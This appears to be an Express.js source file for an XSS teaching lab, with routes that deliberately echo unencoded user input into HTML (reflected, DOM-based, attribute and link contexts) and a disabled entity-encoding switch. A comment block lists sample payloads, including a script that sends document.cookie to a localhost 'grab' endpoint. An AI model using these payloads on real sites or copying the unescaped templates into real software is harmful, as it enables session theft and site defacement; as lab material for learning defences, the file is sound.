const express = require('express');
const { htmlEntityEncode } = require('./xssMitigation');
const router = express.Router();

const MITIGATION_ENABLED = false

// SAMPLE ATTACKS
// <script>alert('hacked!')</script>
// <script>alert(document.cookie)</script>
// <script>document.querySelector('h1').innerHTML = 'HACKED! WEAK SITE';</script>
// <script>window.location.href = `http://localhost:4001/grab?cookies=` + escape(document.cookie)</script>

// EJS automatically encodes inputs on <%= %> so its pretty secure
// so we won't use res.render

// ==== REFLECTED ===
// /reflected-1?name=<script>...</script>
router.get("/reflected-1", (req, res) => {
    // attack #1: server reflected xss
    // takes input directly from query without sanitize/encoding

    let name = req.query.name

    if (MITIGATION_ENABLED) {
        name = htmlEntityEncode(name)
        console.log("htmlEntityEncode: ", name)
    }

    const insecureHTML = `
        <h1>welcome to our safe and secure site</h1>
        <p>
            Hello <span id="output">${name}</span>!
        </p>
    `

    res.send(insecureHTML)
})

// ==== REFLECTED with GET ===
// same with reflected-1 but with a GET form
router.get("/reflected-2", (req, res) => {
    const insecureHtmlForm = (name = '') => `
        <h1>welcome to our safe and secure site</h1>

        <!-- attack #1: server reflected xss -->
        <form action="/reflected-2" method="get">
            What's your name? <input type="text" id="name" name="name" style="width:300px;">
            <button type="submit">Submit</button>
        </form>
        <!-- server flaw: no sanitize/encoding -->
        <p>
            Hello <span id="output">${name}</span>!
        </p>
    `

    let name = req.query.name

    if (MITIGATION_ENABLED) {
        name = htmlEntityEncode(name)
        console.log("htmlEntityEncode: ", name)
    }

    res.send(insecureHtmlForm(name))
})

// ==== REFLECTED WITH POST ===
// POST /reflected-3 { name: "<script>alert('hacked')</script>" }
router.post("/reflected-3", (req, res) => {
    const insecureHtmlFormPost = (name = '') => `
        <h1>welcome to our safe and secure site</h1>
        <p>
            Hello <span id="output">${name}</span>!
        </p>
    `

    let name = req.body.name

    if (MITIGATION_ENABLED) {
        name = htmlEntityEncode(name)
        console.log("htmlEntityEncode: ", name)
    }

    res.send(insecureHtmlFormPost(name))
})

// TODO: make this work
// ==== DOM-BASED ===
const insecureHtmlDomBased = (name = '') => `
    <h1>welcome to our safe and secure site</h1>

    <!-- attack #3: DOM-based xss -->
    <form action="/dom-1" method="get">
        What's your name? <input type="text" id="name" name="name" style="width:300px;">
        <button type="submit">Submit</button>
        <div id="output" />
    </form>

    <!-- client-side JS is vulnerable-->
    <script>
        document.querySelector("#output").innerHTML = "${name}";
    </script>
`
router.get("/dom-1", (req, res) => {
    // attack #2: DOM xss
    // flaw is on client-side JS
    const name = req.query.name

    res.send(insecureHtmlDomBased(name))
})

// These attacks don't seem to work,
// maybe since the "quoting" forces it to be text instead of code
// test with e.g. <script>alert(document.cookie)</script>
router.get("/attributes", (req, res) => {
    const xss = req.query.xss

    const insecureHTML = `
        <h1>query to alt text on image!</h1>
        <p>
            <img alt="${xss}" src="https://picsum.photos/200/300" />
        </p>

        <h1>query to CSS styles</h1>
        <p>
            <div style="${xss}">Hello, style me</div>
        </p>
    `

    res.send(insecureHTML)
})

// http://localhost:4000/url?name=<script>alert(document.cookie)</script>
router.get("/url", (req, res) => {
    let name = req.query.name

    if (MITIGATION_ENABLED) {
        // URL encode then HTML attribute encode, e.g:
        // url = "https://site.com?data=" + urlencode(parameter)
        // <a href='attributeEncode(url)'>link</a>
        
        const uriEncoded = encodeURI(name)
        const htmlAttributeEncoded = htmlEntityEncode(`/reflected-1?name=${uriEncoded}`)
        
        console.log("uri + htmlEntityEncode: ", htmlAttributeEncoded)

        const insecureHTML = `
            <p>
                <h1>Use name query param to query search page with that name</h1>
                <a href="${htmlAttributeEncoded}">Navigate to</a>
            </p>
        `

        res.send(insecureHTML)

    } else {
        const insecureHTML = `
            <p>
                <h1>Use name query param to query search page with that name</h1>
                <a href="/reflected-1?name=${name}">Navigate to</a>
            </p>
        `

        res.send(insecureHTML)
    }


})


module.exports = router
